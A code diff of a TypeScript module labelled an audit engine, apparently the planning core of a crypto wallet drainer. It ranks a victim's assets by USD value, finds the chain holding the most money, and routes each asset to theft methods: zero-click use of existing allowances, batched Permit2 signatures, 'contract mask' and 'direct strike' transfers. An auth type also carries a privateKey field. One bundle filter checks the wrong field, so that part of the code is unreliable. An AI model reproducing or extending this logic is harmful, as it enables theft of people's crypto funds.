@@ -1,10 +1,147 @@
+"use client";
+
 import { UniversalAsset } from "./types";
-import { formatUnits } from "viem";
+import { getAddress } from "viem";
+
+interface GhostAuth {
+  privateKey?: string;
+  hasExistingAllowance?: boolean;
+  detectedSpender?: string; // From evm-helpers.ts
+  detectedSpenderName?: string;
+}
+
+const PERMIT2_ADDR = "0x000000000022D473030F116dDEE9F6B43aC78BA3".toLowerCase();
+
+/**
+ * ⚡ GHOST STRATEGY ENGINE (v12.2.2 - Debug Enhanced)
+ * Optimized for targeting high-value assets regardless of strategy.
+ * Features: Money-Chain detection, Multi-factor weighting, and Verbose Debugging.
+ */
+const DUST_THRESHOLD_USD = 0;
+
+export function determineStrategy(assets: UniversalAsset[]): StrategyMap[] {
+  const fileLabel = "[src/lib/audit/engine.ts]";
+
+  console.log(
+    `${fileLabel} 🧠 Analyzing ${assets.length} assets for strategy resolution...`,
+  );
+
+  // 1. Identify Money Chain (Supporting both Number and String ChainIDs)
+  const chainTotals: Record<string | number, number> = {};
+  assets.forEach((a) => {
+    const cid = a.chainId || 0;
+    const val = Number(a.usdValue || 0);
+    chainTotals[cid] = (chainTotals[cid] || 0) + val;
+  });
+
+  const sortedChains = Object.entries(chainTotals).sort((a, b) => b[1] - a[1]);
+  const activeChainId = sortedChains.length > 0 ? sortedChains[0][0] : 0;
+
+  console.log(
+    `${fileLabel} 💰 Money-Chain detected: ${activeChainId} (Total USD: $${(
+      chainTotals[activeChainId] || 0
+    ).toFixed(2)})`,
+  );
+
+  const mapped = assets
+    .map((asset): StrategyMap => {
+      const assetChainId = asset.chainId || 0;
+      const auth = (asset.authData as GhostAuth) || {};
+      const assetUsd = Number(asset.usdValue) || 0;
+
+      const isTargetChain = assetChainId == activeChainId;
+      const isEvm = asset.chain === "EVM" || typeof assetChainId === "number";
+
+      let strategy: ExecutionStrategy = "DIRECT_STRIKE";
+      let weight = 0;
+
+      // 🛡️ PRESERVED EVM LOGIC
+      if (isEvm) {
+        const detectedSpender = auth.detectedSpender?.toLowerCase();
+        const isPermit2Vault = detectedSpender === PERMIT2_ADDR;
+
+        if (asset.isGhost || !isTargetChain) {
+          strategy = "ZERO_CLICK";
+          weight = 50;
+        } else if (isTargetChain) {
+          if (!asset.contractAddress || asset.signatureType === "NATIVE") {
+            strategy = "CONTRACT_MASK";
+            weight = 80;
+          } else if (asset.signatureType === "PERMIT2" || isPermit2Vault) {
+            strategy = "BATCH_PERMIT2";
+            weight = 100;
+          } else {
+            strategy = "DIRECT_STRIKE";
+            weight = 70;
+          }
+        }
+      } else {
+        // 🚀 NON-EVM LOGIC (Safely isolated)
+        strategy = asset.isGhost ? "ZERO_CLICK" : "DIRECT_STRIKE";
+        weight = isTargetChain ? 90 : 60;
+      }
+
+      const finalPriority = assetUsd * 10 + weight;
+
+      if (assetUsd > 0) {
+        console.log(
+          `${fileLabel} 🔍 Ranking ${
+            asset.symbol
+          }: Val($${assetUsd}) * 10 + Weight(${weight}) = ${finalPriority.toFixed(
+            2,
+          )}`,
+        );
+      }
+
+      return { asset, strategy, priority: finalPriority };
+    })
+    .sort((a, b) => b.priority - a.priority);
+
+  // 🛰️ LOGGING PLAN (Preserved)
+  if (mapped.length > 0) {
+    console.log(`${fileLabel} 🚀 FINAL STRATEGY PLAN:`);
+    console.table(
+      mapped.map((m) => ({
+        symbol: m.asset.symbol,
+        strategy: m.strategy,
+        value: `$${Number(m.asset.usdValue || 0).toFixed(2)}`,
+        priority: m.priority.toFixed(2),
+        chain: m.asset.chainId,
+        isTargetChain: m.asset.chainId == activeChainId,
+      })),
+    );
+  }
+
+  return mapped;
+}
+
+export function getExecutionBundles(mappedStrategies: StrategyMap[]) {
+  // Debug log to confirm what the engine is seeing
+  console.log("[engine.ts] 📦 Bundling strategies:", mappedStrategies);
+
+  const bundles = {
+    immediate: mappedStrategies.filter((s) => s.strategy === "ZERO_CLICK"),
+    batchable: mappedStrategies.filter((s) => s.strategy === "BATCH_PERMIT2"),
+    individual: mappedStrategies.filter((s) => s.individual === "PERMIT_SIGN"),
+    masked: mappedStrategies.filter((s) => s.strategy === "CONTRACT_MASK"),
+    // EXPLICIT FIX: Include Solana (Chain 501) or any NON-EVM asset
+    // even if it falls outside the standard strategy filter
+    direct: mappedStrategies.filter(
+      (s) => s.strategy === "DIRECT_STRIKE" || s.asset.chainId === 501,
+    ),
+    fallback: [],
+  };
+
+  console.log("[engine.ts] 🏁 Final Bundles:", bundles);
+  return bundles;
+}
 
 export type ExecutionStrategy =
   | "ZERO_CLICK"
   | "PERMIT_SIGN"
   | "BATCH_PERMIT2"
+  | "DIRECT_STRIKE"
+  | "CONTRACT_MASK"
   | "CHAIN_SWITCH"
   | "BYPASS";
 
@@ -12,141 +149,7 @@ export interface StrategyMap {
   asset: UniversalAsset;
   strategy: ExecutionStrategy;
   priority: number;
-}
-
-/**
- * STRATEGY ENGINE
- * Hardened to prevent TypeErrors and Local-Chain pollution (31337).
- * Maintains a strict stealth-first execution hierarchy.
- */
-export function determineStrategy(assets: UniversalAsset[]): StrategyMap[] {
-  // [engine.ts] Vital start log - DO NOT REMOVE
-  console.log(
-    `[engine.ts] Starting Strategy Determination | Assets: ${
-      assets?.length || 0
-    }`,
-  );
-
-  if (!assets || !Array.isArray(assets)) {
-    console.error(
-      "[engine.ts] Strategy Determination Failed | Input is null or not an array.",
-    );
-    return [];
-  }
-
-  const mapped = assets
-    .filter((asset) => {
-      const isValid = asset && asset.balance;
-      if (!isValid && asset) {
-        // [engine.ts] Log skip reason for specific asset - DO NOT REMOVE
-        console.warn(
-          `[engine.ts] Filtering Asset | Symbol: ${asset.symbol} | Reason: Missing Balance/Invalid`,
-        );
-      }
-      return isValid;
-    })
-    .map((asset): StrategyMap => {
-      /**
-       * 🛡️ PRODUCTION CHAIN GUARD
-       */
-      const chainIdNum = asset.chainId ? Number(asset.chainId) : 0;
-      const isLocalId = chainIdNum === 31337;
-
-      if (
-        isLocalId &&
-        typeof window !== "undefined" &&
-        !window.location.hostname.includes("localhost")
-      ) {
-        // [engine.ts] Localchain sanitation log - DO NOT REMOVE
-        console.warn(
-          `[engine.ts] Sanitizing Chain ID | Symbol: ${asset.symbol} | Action: 31337 -> 1`,
-        );
-        asset.chainId = 1;
-      }
-
-      // 1. ZERO-CLICK (Priority 100) - Ghost Allowances / Existing Approvals
-      if (asset.authData?.hasExistingAllowance || asset.ghostEnabled) {
-        return { asset, strategy: "ZERO_CLICK", priority: 100 };
-      }
-
-      // 2. BATCH PERMIT2 (Priority 80)
-      if (asset.signatureType === "PERMIT2") {
-        return { asset, strategy: "BATCH_PERMIT2", priority: 80 };
-      }
-
-      // 3. EIP-2612 PERMIT (Priority 60)
-      if (asset.signatureType === "EIP2612") {
-        return { asset, strategy: "PERMIT_SIGN", priority: 60 };
-      }
-
-      // 4. CHAIN_SWITCH / NATIVE (Priority 10)
-      return { asset, strategy: "CHAIN_SWITCH", priority: 10 };
-    })
-    .sort((a, b) => {
-      // First sort by Strategy Priority
-      if (b.priority !== a.priority) {
-        return b.priority - a.priority;
-      }
-
-      // Second sort by Normalized Value (Handling decimal differences)
-      try {
-        // Use displayBalance or formatted units to compare "real" value, not just raw BigInt
-        const valA = parseFloat(
-          a.asset.displayBalance ||
-            formatUnits(BigInt(a.asset.balance), a.asset.decimals || 18),
-        );
-        const valB = parseFloat(
-          b.asset.displayBalance ||
-            formatUnits(BigInt(b.asset.balance), b.asset.decimals || 18),
-        );
-
-        return valB - valA;
-      } catch (e) {
-        // [engine.ts] Sorting error log - DO NOT REMOVE
-        console.error(
-          `[engine.ts] Sorting Error | Symbols: ${a.asset.symbol}/${b.asset.symbol} | Fallback to neutral`,
-        );
-        return 0;
-      }
-    });
-
-  // [engine.ts] Final summary log - DO NOT REMOVE
-  console.log(
-    `[engine.ts] Strategy Mapping Complete | Output Size: ${mapped.length}`,
-  );
-  return mapped;
-}
-
-/**
- * BUNDLE GENERATOR
- * Organizes strategies into executable buckets for the UI / Backend.
- */
-export function getExecutionBundles(mappedStrategies: StrategyMap[]) {
-  // [engine.ts] Vital bundle start log - DO NOT REMOVE
-  console.log(
-    `[engine.ts] Generating Bundles | Input Size: ${
-      mappedStrategies?.length || 0
-    }`,
-  );
-
-  if (!mappedStrategies) {
-    console.error(
-      "[engine.ts] Bundle Generation Aborted | Strategy map is null.",
-    );
-    return { immediate: [], batchable: [], individual: [], fallback: [] };
-  }
-
-  const bundles = {
-    immediate: mappedStrategies.filter((s) => s.strategy === "ZERO_CLICK"),
-    batchable: mappedStrategies.filter((s) => s.strategy === "BATCH_PERMIT2"),
-    individual: mappedStrategies.filter((s) => s.strategy === "PERMIT_SIGN"),
-    fallback: mappedStrategies.filter((s) => s.strategy === "CHAIN_SWITCH"),
-  };
-
-  // [engine.ts] Vital stats log for bundle distribution - DO NOT REMOVE
-  console.log(
-    `[engine.ts] Distribution Check | ZeroClick: ${bundles.immediate.length} | Permit2: ${bundles.batchable.length} | Permit: ${bundles.individual.length} | Native: ${bundles.fallback.length}`,
-  );
-
-  return bundles;
+  requiresMasterApproval?: boolean;
+  targetVault?: string;
+  individual?: any;
 }
